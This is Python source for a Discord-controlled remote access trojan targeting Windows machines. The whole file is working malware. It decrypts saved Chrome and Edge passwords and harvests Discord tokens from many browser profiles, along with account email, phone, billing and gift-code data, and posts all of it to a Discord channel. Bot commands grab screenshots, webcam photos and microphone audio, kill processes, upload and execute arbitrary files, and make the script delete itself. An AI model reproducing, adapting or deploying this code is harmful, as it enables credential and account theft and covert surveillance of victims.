import subprocess
import cv2
import discord
from discord.ext import commands
import pyautogui
import io
import pyaudio
import wave
import os
import psutil
import shutil
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import time
from datetime import datetime, timedelta
import re
import requests
from discord import Embed
from win32crypt import CryptUnprotectData

# Replace 'YOUR_BOT_TOKEN' with your bot's token
TOKEN = ''

# Intents are required for certain events and data
intents = discord.Intents.default()
intents.message_content = True

# Create a bot instance with a command prefix
bot = commands.Bot(command_prefix=".", intents=intents)

# Global variables for audio recording
is_recording = False
audio_frames = []
p = pyaudio.PyAudio()
stream = None

# Password grabbing functions
def convert_date(ft):
    utc = datetime.utcfromtimestamp(((10 * int(ft)) - file_name) / nanoseconds)
    return utc.strftime('%Y-%m-%d %H:%M:%S')

def get_master_key():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except: exit()
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password_edge(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e: return "Chrome < 80"

def get_passwords_edge():
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
    try: shutil.copy2(login_db, "Loginvault.db")
    except: print("Edge browser not detected!")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        result = {}
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password_edge(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                result[url] = [username, decrypted_password]
    except: pass

    cursor.close(); conn.close()
    try: os.remove("Loginvault.db")
    except Exception as e: print(e); pass

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except: time.sleep(1)

def decrypt_password_chrome(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except: return ""

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    file_name = "ChromeData.db"
    shutil.copyfile(db_path, file_name)
    db = sqlite3.connect(file_name)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    result = {}
    for row in cursor.fetchall():
        action_url = row[1]
        username = row[2]
        password = decrypt_password_chrome(row[3], key)
        if username or password:
            result[action_url] = [username, password]
        else: continue
    cursor.close(); db.close()
    try: os.remove(file_name)
    except: pass
    return result

def grab_passwords():
    global file_name, nanoseconds
    file_name, nanoseconds = 116444736000000000, 10000000
    result = {}
    try: result = main()
    except: time.sleep(1)

    try: 
        result2 = get_passwords_edge()
        for i in result2.keys():
            result[i] = result2[i]
    except: time.sleep(1)
    
    return result

# Discord token grabbing functions
class grab_discord:
    def initialize(raw_data):
        return fetch_tokens().upload(raw_data)
        
class extract_tokens:
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens, self.uids = [], []
        self.extract()

    def extract(self) -> None:
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path): continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'): continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
                    
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

    def decrypt_val(self, buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return ""

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path): return
        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read(): return
        with open(path, "r", encoding="utf-8") as f: c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def validate_token(self, token: str) -> bool:
        r = requests.get(self.base_url, headers={'Authorization': token})
        if r.status_code == 200:
            return True
        return False

class fetch_tokens:
    def __init__(self):
        self.tokens = extract_tokens().tokens
    
    def upload(self, raw_data):
        if not self.tokens:
            return
        final_to_return = []
        for token in self.tokens:
            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()

            username = user['username'] + '#' + user['discriminator']
            user_id = user['id']
            email = user['email']
            phone = user['phone']
            mfa = user['mfa_enabled']
            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
            
            if user['premium_type'] == 0:
                nitro = 'None'
            elif user['premium_type'] == 1:
                nitro = 'Nitro Classic'
            elif user['premium_type'] == 2:
                nitro = 'Nitro'
            elif user['premium_type'] == 3:
                nitro = 'Nitro Basic'
            else:
                nitro = 'None'

            if billing:
                payment_methods = []
                for method in billing:
                    if method['type'] == 1:
                        payment_methods.append('Credit Card')
                    elif method['type'] == 2:
                        payment_methods.append('PayPal')
                    else:
                        payment_methods.append('Unknown')
                payment_methods = ', '.join(payment_methods)
            else: payment_methods = None

            if guilds:
                hq_guilds = []
                for guild in guilds:
                    admin = int(guild["permissions"]) & 0x8 != 0
                    if admin and guild['approximate_member_count'] >= 100:
                        owner = '✅' if guild['owner'] else '❌'
                        invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                        if len(invites) > 0: invite = 'https://discord.gg/' + invites[0]['code']
                        else: invite = "https://youtu.be/dQw4w9WgXcQ"
                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
                        if len('\n'.join(hq_guilds)) + len(data) >= 1024: break
                        hq_guilds.append(data)

                if len(hq_guilds) > 0: hq_guilds = '\n'.join(hq_guilds) 
                else: hq_guilds = None
            else: hq_guilds = None
            
            if gift_codes:
                codes = []
                for code in gift_codes:
                    name = code['promotion']['outbound_title']
                    code = code['code']
                    data = f":gift: `{name}`\n:ticket: `{code}`"
                    if len('\n\n'.join(codes)) + len(data) >= 1024: break
                    codes.append(data)
                if len(codes) > 0: codes = '\n\n'.join(codes)
                else: codes = None
            else: codes = None

            if not raw_data:
                embed = Embed(title=f"{username} ({user_id})", color=0x0084ff)
                embed.set_thumbnail(url=avatar)

                embed.add_field(name="\u200b\n📜 Token:", value=f"```{token}```\n\u200b", inline=False)
                embed.add_field(name="💎 Nitro:", value=f"{nitro}", inline=False)
                embed.add_field(name="💳 Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=False)
                embed.add_field(name="🔒 MFA:", value=f"{mfa}\n\u200b", inline=False)
                
                embed.add_field(name="📧 Email:", value=f"{email if email != None else 'None'}", inline=False)
                embed.add_field(name="📳 Phone:", value=f"{phone if phone != None else 'None'}\n\u200b", inline=False)    

                if hq_guilds != None:
                    embed.add_field(name="🏰 HQ Guilds:", value=hq_guilds, inline=False)

                if codes != None:
                    embed.add_field(name="\u200b\n🎁 Gift Codes:", value=codes, inline=False)

                final_to_return.append(embed)
            else:
                final_to_return.append(json.dumps({'username': username, 'token': token, 'nitro': nitro, 'billing': (payment_methods if payment_methods != "" else "None"), 'mfa': mfa, 'email': (email if email != None else "None"), 'phone': (phone if phone != None else "None"), 'hq_guilds': hq_guilds, 'gift_codes': codes}))
        return final_to_return

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command(name='ss')
async def send_screenshot(ctx):
    screenshot = pyautogui.screenshot()
    with io.BytesIO() as image_binary:
        screenshot.save(image_binary, 'PNG')
        image_binary.seek(0)
        await ctx.send(file=discord.File(fp=image_binary, filename='screenshot.png'))

@bot.command(name='listapps')
async def list_open_apps(ctx):
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            process_name = proc.info['name']
            process_name = process_name.encode('ascii', 'ignore').decode('ascii')
            processes.append(process_name)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    unique_processes = sorted(set(processes), key=lambda x: len(x))

    if not unique_processes:
        await ctx.send("No processes found.")
        return

    chunks = []
    current_chunk = ""
    for process in unique_processes:
        process_entry = f"`{process}`\n"
        if len(current_chunk) + len(process_entry) > 1024:
            chunks.append(current_chunk)
            current_chunk = process_entry
        else:
            current_chunk += process_entry

    if current_chunk:
        chunks.append(current_chunk)

    embed = discord.Embed(
        title="📊 Open Applications",
        description="Here are the currently running processes, sorted by name length:",
        color=discord.Color.blue()
    )

    for i, chunk in enumerate(chunks):
        embed.add_field(
            name=f"Processes (Part {i + 1})",
            value=chunk,
            inline=False
        )

    embed.set_footer(text=f"Total processes: {len(unique_processes)}")

    await ctx.send(embed=embed)

@bot.command(name='kill')
async def kill_app(ctx, app_name: str):
    killed = False
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'].lower() == app_name.lower():
                proc.kill()
                killed = True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    if killed:
        await ctx.send(f"Killed all processes with the name: {app_name}")
    else:
        await ctx.send(f"No processes found with the name: {app_name}")

@bot.command(name='upload')
async def upload_file(ctx):
    """
    Uploads a file to the Downloads folder.
    Usage: .upload (with a file attached)
    """
    if not ctx.message.attachments:
        await ctx.send("Please attach a file to upload.")
        return

    # Get the first attached file
    file = ctx.message.attachments[0]
    file_name = file.filename

    # Ensure the file name is valid
    if not file_name:
        await ctx.send("Invalid file name.")
        return

    # Save the file to the user's Downloads folder
    downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
    file_path = os.path.join(downloads_path, file_name)

    try:
        # Download the file
        await file.save(file_path)
        await ctx.send(f"File saved to: `{file_path}`")
    except Exception as e:
        await ctx.send(f"Failed to save the file: {e}")
    
@bot.command(name='implode')
async def self_destruct(ctx):
    script_path = os.path.abspath(__file__)
    os.remove(script_path)
    await ctx.send("Self-destruct initiated. Bot script deleted.")
    await bot.close()

@bot.command(name='join')
async def join_voice(ctx):
    if ctx.author.voice:
        channel = ctx.author.voice.channel
        await channel.connect()
        await ctx.send(f'Joined {channel.name}')
    else:
        await ctx.send("You are not in a voice channel!")

@bot.command(name='leave')
async def leave_voice(ctx):
    if ctx.voice_client:
        await ctx.voice_client.disconnect()
        await ctx.send("Left the voice channel.")
    else:
        await ctx.send("I'm not in a voice channel!")

@bot.command(name='record')
async def start_recording(ctx):
    global is_recording, audio_frames, stream

    if is_recording:
        await ctx.send("Already recording!")
        return

    await ctx.send("Recording started. Say `.stop` to stop recording.")

    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    CHUNK = 1024

    is_recording = True
    audio_frames = []
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

    while is_recording:
        data = stream.read(CHUNK)
        audio_frames.append(data)

    stream.stop_stream()
    stream.close()

    with wave.open("recorded_audio.wav", 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(audio_frames))

    await ctx.send("Recording stopped and saved as `recorded_audio.wav`.")

@bot.command(name='stop')
async def stop_recording(ctx):
    global is_recording
    is_recording = False
    await ctx.send("Recording stopped.")

@bot.command(name='webcam')
async def take_webcam_photo(ctx):
    """
    Takes a photo using the webcam and sends it to the channel.
    Usage: .webcam
    """
    try:
        # Access the webcam
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await ctx.send("Failed to access webcam.")
            return

        # Capture a frame
        ret, frame = cap.read()
        if not ret:
            await ctx.send("Failed to capture photo.")
            return

        # Save the photo
        photo_path = "webcam_photo.jpg"
        cv2.imwrite(photo_path, frame)
        cap.release()

        # Send the photo to the channel
        await ctx.send(file=discord.File(photo_path))
        os.remove(photo_path)  # Clean up the file
    except Exception as e:
        await ctx.send(f"Failed to take webcam photo: {e}")


@bot.command(name='blockinput')
async def block_input(ctx):
    """
    Blocks keyboard and mouse input.
    Usage: .blockinput
    """
    global input_blocked
    if input_blocked:
        await ctx.send("Input is already blocked.")
        return

    try:
        pyautogui.FAILSAFE = False
        pyautogui.moveTo(0, 0)  # Move mouse to corner to prevent failsafe
        pyautogui.alert("Input is now blocked. Press OK to unblock.", timeout=999999)
        input_blocked = True
        await ctx.send("Input blocked.")
    except Exception as e:
        await ctx.send(f"Failed to block input: {e}")

@bot.command(name='unblockinput')
async def unblock_input(ctx):
    """
    Unblocks keyboard and mouse input.
    Usage: .unblockinput
    """
    global input_blocked
    if not input_blocked:
        await ctx.send("Input is not blocked.")
        return

    try:
        pyautogui.FAILSAFE = True
        input_blocked = False
        await ctx.send("Input unblocked.")
    except Exception as e:
        await ctx.send(f"Failed to unblock input: {e}")

@bot.command(name='execute')
async def execute_file(ctx, file_path: str):
    """
    Executes a file on the system.
    Usage: .execute <file_path>
    """
    if not os.path.exists(file_path):
        await ctx.send(f"File not found: `{file_path}`")
        return

    try:
        # Execute the file
        subprocess.Popen(file_path, shell=True)
        await ctx.send(f"Executed file: `{file_path}`")
    except Exception as e:
        await ctx.send(f"Failed to execute file: {e}")

@bot.command(name='play')
async def play_audio(ctx):
    if not ctx.voice_client:
        await ctx.send("I'm not in a voice channel!")
        return

    if not os.path.exists("recorded_audio.wav"):
        await ctx.send("No recording found. Use `.record` first.")
        return

    ctx.voice_client.play(discord.FFmpegPCMAudio("recorded_audio.wav"))
    await ctx.send("Playing recorded audio.")

@bot.command(name='grabpasswords')
async def grab_passwords_command(ctx):
    passwords = grab_passwords()
    if not passwords:
        await ctx.send("No passwords found.")
        return

    message = "Grabbed Passwords:\n"
    for url, credentials in passwords.items():
        message += f"URL: {url}\nUsername: {credentials[0]}\nPassword: {credentials[1]}\n\n"

    await ctx.send(message)

@bot.command(name='grabdiscordtokens')
async def grab_discord_tokens(ctx):
    tokens = grab_discord.initialize(raw_data=False)
    if not tokens:
        await ctx.send("No Discord tokens found.")
        return

    for embed in tokens:
        await ctx.send(embed=embed)

# Run the bot
bot.run(TOKEN)
